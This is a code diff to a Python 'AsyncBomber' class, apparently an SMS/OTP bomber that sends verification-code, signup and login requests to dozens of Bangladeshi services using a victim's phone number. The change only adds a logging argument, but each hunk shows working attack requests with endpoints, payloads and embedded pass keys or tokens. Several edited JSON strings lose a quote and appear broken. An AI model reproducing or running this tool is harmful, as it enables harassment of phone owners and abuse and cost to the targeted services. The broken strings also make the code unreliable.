+                await self.log_event("API20 - Circle Signup", success, res.status, api_key="API20 - Circle Signup")
                 return success
         except Exception:
-            await self.log_event("API20 - Circle Signup", False, "Error")
+            await self.log_event("API20 - Circle Signup", False, "Error", api_key="API20 - Circle Signup")
             return False
 
 
@@ -1928,10 +1932,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API21 - BDTickets Auth", success, res.status)
+                await self.log_event("API21 - BDTickets Auth", success, res.status, api_key="API21 - BDTickets Auth")
                 return success
         except Exception:
-            await self.log_event("API21 - BDTickets Auth", False, "Error")
+            await self.log_event("API21 - BDTickets Auth", False, "Error", api_key="API21 - BDTickets Auth")
             return False
 
 
@@ -1941,10 +1945,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API22 - Grameenphone OTP", success, res.status)
+                await self.log_event("API22 - Grameenphone OTP", success, res.status, api_key="API22 - Grameenphone OTP")
                 return success
         except Exception:
-            await self.log_event("API22 - Grameenphone OTP", False, "Error")
+            await self.log_event("API22 - Grameenphone OTP", False, "Error", api_key="API22 - Grameenphone OTP")
             return False
 
 
@@ -1954,10 +1958,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API23 - RFL BestBuy Login", success, res.status)
+                await self.log_event("API23 - RFL BestBuy Login", success, res.status, api_key="API23 - RFL BestBuy Login")
                 return success
         except Exception:
-            await self.log_event("API23 - RFL BestBuy Login", False, "Error")
+            await self.log_event("API23 - RFL BestBuy Login", False, "Error", api_key="API23 - RFL BestBuy Login")
             return False
 
 
@@ -1967,10 +1971,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API24 - Chorki Login", success, res.status)
+                await self.log_event("API24 - Chorki Login", success, res.status, api_key="API24 - Chorki Login")
                 return success
         except Exception:
-            await self.log_event("API24 - Chorki Login", False, "Error")
+            await self.log_event("API24 - Chorki Login", False, "Error", api_key="API24 - Chorki Login")
             return False
 
 
@@ -1980,10 +1984,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API25 - Hishab Express Login", success, res.status)
+                await self.log_event("API25 - Hishab Express Login", success, res.status, api_key="API25 - Hishab Express Login")
                 return success
         except Exception:
-            await self.log_event("API25 - Hishab Express Login", False, "Error")
+            await self.log_event("API25 - Hishab Express Login", False, "Error", api_key="API25 - Hishab Express Login")
             return False
 
 
@@ -1993,10 +1997,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API26 - Chorcha Auth Check", success, res.status)
+                await self.log_event("API26 - Chorcha Auth Check", success, res.status, api_key="API26 - Chorcha Auth Check")
                 return success
         except Exception:
-            await self.log_event("API26 - Chorcha Auth Check", False, "Error")
+            await self.log_event("API26 - Chorcha Auth Check", False, "Error", api_key="API26 - Chorcha Auth Check")
             return False
 
 
@@ -2006,10 +2010,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API27 - Wafilife OTP", success, res.status)
+                await self.log_event("API27 - Wafilife OTP", success, res.status, api_key="API27 - Wafilife OTP")
                 return success
         except Exception:
-            await self.log_event("API27 - Wafilife OTP", False, "Error")
+            await self.log_event("API27 - Wafilife OTP", False, "Error", api_key="API27 - Wafilife OTP")
             return False
 
 
@@ -2019,10 +2023,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API28 - Robi Account OTP", success, res.status)
+                await self.log_event("API28 - Robi Account OTP", success, res.status, api_key="API28 - Robi Account OTP")
                 return success
         except Exception:
-            await self.log_event("API28 - Robi Account OTP", False, "Error")
+            await self.log_event("API28 - Robi Account OTP", False, "Error", api_key="API28 - Robi Account OTP")
             return False
 
 
@@ -2032,10 +2036,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API29 - Chardike OTP", success, res.status)
+                await self.log_event("API29 - Chardike OTP", success, res.status, api_key="API29 - Chardike OTP")
                 return success
         except Exception:
-            await self.log_event("API29 - Chardike OTP", False, "Error")
+            await self.log_event("API29 - Chardike OTP", False, "Error", api_key="API29 - Chardike OTP")
             return False
 
 
@@ -2045,10 +2049,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API30 - E-TestPaper OTP", success, res.status)
+                await self.log_event("API30 - E-TestPaper OTP", success, res.status, api_key="API30 - E-TestPaper OTP")
                 return success
         except Exception:
-            await self.log_event("API30 - E-TestPaper OTP", False, "Error")
+            await self.log_event("API30 - E-TestPaper OTP", False, "Error", api_key="API30 - E-TestPaper OTP")
             return False
 
 
@@ -2058,10 +2062,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API31 - GPay Signup", success, res.status)
+                await self.log_event("API31 - GPay Signup", success, res.status, api_key="API31 - GPay Signup")
                 return success
         except Exception:
-            await self.log_event("API31 - GPay Signup", False, "Error")
+            await self.log_event("API31 - GPay Signup", False, "Error", api_key="API31 - GPay Signup")
             return False
 
 
@@ -2071,10 +2075,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API32 - Applink OTP", success, res.status)
+                await self.log_event("API32 - Applink OTP", success, res.status, api_key="API32 - Applink OTP")
                 return success
         except Exception:
-            await self.log_event("API32 - Applink OTP", False, "Error")
+            await self.log_event("API32 - Applink OTP", False, "Error", api_key="API32 - Applink OTP")
             return False
 
 
@@ -2084,10 +2088,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API33 - Priyoshikkhaloy", success, res.status)
+                await self.log_event("API33 - Priyoshikkhaloy", success, res.status, api_key="API33 - Priyoshikkhaloy")
                 return success
         except Exception:
-            await self.log_event("API33 - Priyoshikkhaloy", False, "Error")
+            await self.log_event("API33 - Priyoshikkhaloy", False, "Error", api_key="API33 - Priyoshikkhaloy")
             return False
 
 
@@ -2097,10 +2101,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"msisdn":"88{phone}","currentTimeLong":" + System.currentTimeMillis() + ","passKey":"qOQNBtVmoTTPVmfn"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API34 - Kabbik OTP", success, res.status)
+                await self.log_event("API34 - Kabbik OTP", success, res.status, api_key="API34 - Kabbik OTP")
                 return success
         except Exception:
-            await self.log_event("API34 - Kabbik OTP", False, "Error")
+            await self.log_event("API34 - Kabbik OTP", False, "Error", api_key="API34 - Kabbik OTP")
             return False
 
 
@@ -2110,10 +2114,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API35 - Salextra", success, res.status)
+                await self.log_event("API35 - Salextra", success, res.status, api_key="API35 - Salextra")
                 return success
         except Exception:
-            await self.log_event("API35 - Salextra", False, "Error")
+            await self.log_event("API35 - Salextra", False, "Error", api_key="API35 - Salextra")
             return False
 
 
@@ -2121,12 +2125,12 @@ class AsyncBomber:
         target = self.target[1:] if self.target.startswith('0') else self.target
         url = f"https://api.sundora.com.bd/api/user/customer/".replace("{phone}", target)
         try:
-            async with self.session.post(url, json=json.loads('{"customer":{"email":"user{phone}@gmail.com","password":"#bUV?\'3*N#7N}.g","password_confirmation":"#bUV?\'3*N#7N}.g","phone":"+880{phone}","draft_order_id":null,"first_name":"User","last_name":"Test","note":{"birthday":"","gender":"male"},"withTimeout":true,"newsletter_email":true,"newsletter_sms":true}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
+            async with self.session.post(url, json=json.loads('{"customer":{"email":"user{phone}@gmail.com","password":"#bUV?\'3*N#7N}.g","password_confirmation":"#bUV?\'3*N#7N}.g","phone":"+880{phone}","draft_order_id":null,"first_name":"User","last_name":"Test","note":{"birthday":","gender":"male"},"withTimeout":true,"newsletter_email":true,"newsletter_sms":true}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API36 - Sundora", success, res.status)
+                await self.log_event("API36 - Sundora", success, res.status, api_key="API36 - Sundora")
                 return success
         except Exception:
-            await self.log_event("API36 - Sundora", False, "Error")
+            await self.log_event("API36 - Sundora", False, "Error", api_key="API36 - Sundora")
             return False
 
 
@@ -2136,10 +2140,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API37 - MyGP Cinematic", success, res.status)
+                await self.log_event("API37 - MyGP Cinematic", success, res.status, api_key="API37 - MyGP Cinematic")
                 return success
         except Exception:
-            await self.log_event("API37 - MyGP Cinematic", False, "Error")
+            await self.log_event("API37 - MyGP Cinematic", False, "Error", api_key="API37 - MyGP Cinematic")
             return False
 
 
@@ -2149,10 +2153,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API38 - Bajistar", success, res.status)
+                await self.log_event("API38 - Bajistar", success, res.status, api_key="API38 - Bajistar")
                 return success
         except Exception:
-            await self.log_event("API38 - Bajistar", False, "Error")
+            await self.log_event("API38 - Bajistar", False, "Error", api_key="API38 - Bajistar")
             return False
 
 
@@ -2162,10 +2166,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API39 - Doctime", success, res.status)
+                await self.log_event("API39 - Doctime", success, res.status, api_key="API39 - Doctime")
                 return success
         except Exception:
-            await self.log_event("API39 - Doctime", False, "Error")
+            await self.log_event("API39 - Doctime", False, "Error", api_key="API39 - Doctime")
             return False
 
 
@@ -2175,10 +2179,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API40 - Grameenphone FI", success, res.status)
+                await self.log_event("API40 - Grameenphone FI", success, res.status, api_key="API40 - Grameenphone FI")
                 return success
         except Exception:
-            await self.log_event("API40 - Grameenphone FI", False, "Error")
+            await self.log_event("API40 - Grameenphone FI", False, "Error", api_key="API40 - Grameenphone FI")
             return False
 
 
@@ -2188,10 +2192,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API41 - Meenabazar", success, res.status)
+                await self.log_event("API41 - Meenabazar", success, res.status, api_key="API41 - Meenabazar")
                 return success
         except Exception:
-            await self.log_event("API41 - Meenabazar", False, "Error")
+            await self.log_event("API41 - Meenabazar", False, "Error", api_key="API41 - Meenabazar")
             return False
 
 
@@ -2201,10 +2205,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API42 - Medeasy", success, res.status)
+                await self.log_event("API42 - Medeasy", success, res.status, api_key="API42 - Medeasy")
                 return success
         except Exception:
-            await self.log_event("API42 - Medeasy", False, "Error")
+            await self.log_event("API42 - Medeasy", False, "Error", api_key="API42 - Medeasy")
             return False
 
 
@@ -2214,10 +2218,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API43 - Iqra Live", success, res.status)
+                await self.log_event("API43 - Iqra Live", success, res.status, api_key="API43 - Iqra Live")
                 return success
         except Exception:
-            await self.log_event("API43 - Iqra Live", False, "Error")
+            await self.log_event("API43 - Iqra Live", False, "Error", api_key="API43 - Iqra Live")
             return False
 
 
@@ -2227,10 +2231,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API44 - Chokrojan", success, res.status)
+                await self.log_event("API44 - Chokrojan", success, res.status, api_key="API44 - Chokrojan")
                 return success
         except Exception:
-            await self.log_event("API44 - Chokrojan", False, "Error")
+            await self.log_event("API44 - Chokrojan", False, "Error", api_key="API44 - Chokrojan")
             return False
 
 
@@ -2240,10 +2244,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API45 - Shomvob", success, res.status)
+                await self.log_event("API45 - Shomvob", success, res.status, api_key="API45 - Shomvob")
                 return success
         except Exception:
-            await self.log_event("API45 - Shomvob", False, "Error")
+            await self.log_event("API45 - Shomvob", False, "Error", api_key="API45 - Shomvob")
             return False
 
 
@@ -2253,10 +2257,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API46 - RedX Signup 2", success, res.status)
+                await self.log_event("API46 - RedX Signup 2", success, res.status, api_key="API46 - RedX Signup 2")
                 return success
         except Exception:
-            await self.log_event("API46 - RedX Signup 2", False, "Error")
+            await self.log_event("API46 - RedX Signup 2", False, "Error", api_key="API46 - RedX Signup 2")
             return False
 
 
@@ -2266,10 +2270,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API47 - MyGP Send OTP", success, res.status)
+                await self.log_event("API47 - MyGP Send OTP", success, res.status, api_key="API47 - MyGP Send OTP")
                 return success
         except Exception:
-            await self.log_event("API47 - MyGP Send OTP", False, "Error")
+            await self.log_event("API47 - MyGP Send OTP", False, "Error", api_key="API47 - MyGP Send OTP")
             return False
 
 
@@ -2277,12 +2281,12 @@ class AsyncBomber:
         target = self.target
         url = f"https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount".replace("{phone}", target)
         try:
-            async with self.session.post(url, json=json.loads('{"firstName":"User","lastName":"","gender":"M","email":"user{phone}@gmail.com","userName":"{phone}","password":"Password@123","confirmPassword":"Password@123","mobile":"{phone}","countryCode":"88"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
+            async with self.session.post(url, json=json.loads('{"firstName":"User","lastName":","gender":"M","email":"user{phone}@gmail.com","userName":"{phone}","password":"Password@123","confirmPassword":"Password@123","mobile":"{phone}","countryCode":"88"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API48 - BDJobs", success, res.status)
+                await self.log_event("API48 - BDJobs", success, res.status, api_key="API48 - BDJobs")
                 return success
         except Exception:
-            await self.log_event("API48 - BDJobs", False, "Error")
+            await self.log_event("API48 - BDJobs", False, "Error", api_key="API48 - BDJobs")
             return False
 
 
@@ -2292,10 +2296,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API49 - Ultimate Organic Register", success, res.status)
+                await self.log_event("API49 - Ultimate Organic Register", success, res.status, api_key="API49 - Ultimate Organic Register")
                 return success
         except Exception:
-            await self.log_event("API49 - Ultimate Organic Register", False, "Error")
+            await self.log_event("API49 - Ultimate Organic Register", False, "Error", api_key="API49 - Ultimate Organic Register")
             return False
 
 
@@ -2305,10 +2309,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API50 - Ultimate Organic Forget", success, res.status)
+                await self.log_event("API50 - Ultimate Organic Forget", success, res.status, api_key="API50 - Ultimate Organic Forget")
                 return success
         except Exception:
-            await self.log_event("API50 - Ultimate Organic Forget", False, "Error")
+            await self.log_event("API50 - Ultimate Organic Forget", False, "Error", api_key="API50 - Ultimate Organic Forget")
             return False
 
 
@@ -2318,10 +2322,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API51 - Foodaholic", success, res.status)
+                await self.log_event("API51 - Foodaholic", success, res.status, api_key="API51 - Foodaholic")
                 return success
         except Exception:
-            await self.log_event("API51 - Foodaholic", False, "Error")
+            await self.log_event("API51 - Foodaholic", False, "Error", api_key="API51 - Foodaholic")
             return False
 
 
@@ -2331,10 +2335,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"name":"User","email":"user{phone}@gmail.com","mobile":"{phone}","device_token":"test","otp":null}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API52 - KFC BD", success, res.status)
+                await self.log_event("API52 - KFC BD", success, res.status, api_key="API52 - KFC BD")
                 return success
         except Exception:
-            await self.log_event("API52 - KFC BD", False, "Error")
+            await self.log_event("API52 - KFC BD", False, "Error", api_key="API52 - KFC BD")
             return False
 
 
@@ -2344,10 +2348,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API53 - GP Offer OTP", success, res.status)
+                await self.log_event("API53 - GP Offer OTP", success, res.status, api_key="API53 - GP Offer OTP")
                 return success
         except Exception:
-            await self.log_event("API53 - GP Offer OTP", False, "Error")
+            await self.log_event("API53 - GP Offer OTP", False, "Error", api_key="API53 - GP Offer OTP")
             return False
 
 
@@ -2357,10 +2361,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"mobile":"{phone}","name":"User Test","password":"Password123","email":"user{phone}@gmail.com"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API54 - Eonbazar Register", success, res.status)
+                await self.log_event("API54 - Eonbazar Register", success, res.status, api_key="API54 - Eonbazar Register")
                 return success
         except Exception:
-            await self.log_event("API54 - Eonbazar Register", False, "Error")
+            await self.log_event("API54 - Eonbazar Register", False, "Error", api_key="API54 - Eonbazar Register")
             return False
 
 
@@ -2370,10 +2374,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API55 - Eat-Z", success, res.status)
+                await self.log_event("API55 - Eat-Z", success, res.status, api_key="API55 - Eat-Z")
                 return success
         except Exception:
-            await self.log_event("API55 - Eat-Z", False, "Error")
+            await self.log_event("API55 - Eat-Z", False, "Error", api_key="API55 - Eat-Z")
             return False
 
 
@@ -2383,10 +2387,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API56 - Osudpotro", success, res.status)
+                await self.log_event("API56 - Osudpotro", success, res.status, api_key="API56 - Osudpotro")
                 return success
         except Exception:
-            await self.log_event("API56 - Osudpotro", False, "Error")
+            await self.log_event("API56 - Osudpotro", False, "Error", api_key="API56 - Osudpotro")
             return False
 
 
@@ -2396,10 +2400,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"operationName":"sendOTP","variables":{"type":1,"mobile":"{phone}","hash":"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"},"query":"mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API57 - Kormi24", success, res.status)
+                await self.log_event("API57 - Kormi24", success, res.status, api_key="API57 - Kormi24")
                 return success
         except Exception:
-            await self.log_event("API57 - Kormi24", False, "Error")
+            await self.log_event("API57 - Kormi24", False, "Error", api_key="API57 - Kormi24")
             return False
 
 
@@ -2409,10 +2413,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API58 - Weblogin GP", success, res.status)
+                await self.log_event("API58 - Weblogin GP", success, res.status, api_key="API58 - Weblogin GP")
                 return success
         except Exception:
-            await self.log_event("API58 - Weblogin GP", False, "Error")
+            await self.log_event("API58 - Weblogin GP", False, "Error", api_key="API58 - Weblogin GP")
             return False
 
 
@@ -2422,10 +2426,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API59 - Shwapno", success, res.status)
+                await self.log_event("API59 - Shwapno", success, res.status, api_key="API59 - Shwapno")
                 return success
         except Exception:
-            await self.log_event("API59 - Shwapno", False, "Error")
+            await self.log_event("API59 - Shwapno", False, "Error", api_key="API59 - Shwapno")
             return False
 
 
@@ -2435,10 +2439,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API60 - Quizgiri", success, res.status)
+                await self.log_event("API60 - Quizgiri", success, res.status, api_key="API60 - Quizgiri")
                 return success
         except Exception:
-            await self.log_event("API60 - Quizgiri", False, "Error")
+            await self.log_event("API60 - Quizgiri", False, "Error", api_key="API60 - Quizgiri")
             return False
 
 
@@ -2448,10 +2452,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API61 - Banglalink MyBL", success, res.status)
+                await self.log_event("API61 - Banglalink MyBL", success, res.status, api_key="API61 - Banglalink MyBL")
                 return success
         except Exception:
-            await self.log_event("API61 - Banglalink MyBL", False, "Error")
+            await self.log_event("API61 - Banglalink MyBL", False, "Error", api_key="API61 - Banglalink MyBL")
             return False
 
 
@@ -2461,10 +2465,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"operationName":"createCustomerOtp","variables":{"auth":{"countryCode":"880","deviceUuid":"test-device","phone":"{phone}"},"device":null},"query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API62 - Walton Plaza", success, res.status)
+                await self.log_event("API62 - Walton Plaza", success, res.status, api_key="API62 - Walton Plaza")
                 return success
         except Exception:
-            await self.log_event("API62 - Walton Plaza", False, "Error")
+            await self.log_event("API62 - Walton Plaza", False, "Error", api_key="API62 - Walton Plaza")
             return False
 
 
@@ -2474,10 +2478,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API63 - PBS", success, res.status)
+                await self.log_event("API63 - PBS", success, res.status, api_key="API63 - PBS")
                 return success
         except Exception:
-            await self.log_event("API63 - PBS", False, "Error")
+            await self.log_event("API63 - PBS", False, "Error", api_key="API63 - PBS")
             return False
 
 
@@ -2485,12 +2489,12 @@ class AsyncBomber:
         target = self.target
         url = f"https://mcprod.aarong.com/graphql".replace("{phone}", target)
         try:
-            async with self.session.post(url, json=json.loads('{"query":"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number) { token message } }","variables":{"email":"","password":"","type":"mobile_number","mobile_number":"{phone}"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
+            async with self.session.post(url, json=json.loads('{"query":"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number) { token message } }","variables":{"email":","password":","type":"mobile_number","mobile_number":"{phone}"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API64 - Aarong", success, res.status)
+                await self.log_event("API64 - Aarong", success, res.status, api_key="API64 - Aarong")
                 return success
         except Exception:
-            await self.log_event("API64 - Aarong", False, "Error")
+            await self.log_event("API64 - Aarong", False, "Error", api_key="API64 - Aarong")
             return False
 
 
@@ -2500,10 +2504,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API65 - Arogga App", success, res.status)
+                await self.log_event("API65 - Arogga App", success, res.status, api_key="API65 - Arogga App")
                 return success
         except Exception:
-            await self.log_event("API65 - Arogga App", False, "Error")
+            await self.log_event("API65 - Arogga App", False, "Error", api_key="API65 - Arogga App")
             return False
 
 
@@ -2513,10 +2517,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API66 - Sundarban Courier", success, res.status)
+                await self.log_event("API66 - Sundarban Courier", success, res.status, api_key="API66 - Sundarban Courier")
                 return success
         except Exception:
-            await self.log_event("API66 - Sundarban Courier", False, "Error")
+            await self.log_event("API66 - Sundarban Courier", False, "Error", api_key="API66 - Sundarban Courier")
             return False
 
 
@@ -2526,10 +2530,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API67 - QuizTime", success, res.status)
+                await self.log_event("API67 - QuizTime", success, res.status, api_key="API67 - QuizTime")
                 return success
         except Exception:
-            await self.log_event("API67 - QuizTime", False, "Error")
+            await self.log_event("API67 - QuizTime", False, "Error", api_key="API67 - QuizTime")
             return False
 
 
@@ -2539,10 +2543,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API68 - DressUp", success, res.status)
+                await self.log_event("API68 - DressUp", success, res.status, api_key="API68 - DressUp")
                 return success
         except Exception:
-            await self.log_event("API68 - DressUp", False, "Error")
+            await self.log_event("API68 - DressUp", False, "Error", api_key="API68 - DressUp")
             return False
 
 
@@ -2552,10 +2556,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API69 - Ghoori Learning", success, res.status)
+                await self.log_event("API69 - Ghoori Learning", success, res.status, api_key="API69 - Ghoori Learning")
                 return success
         except Exception:
-            await self.log_event("API69 - Ghoori Learning", False, "Error")
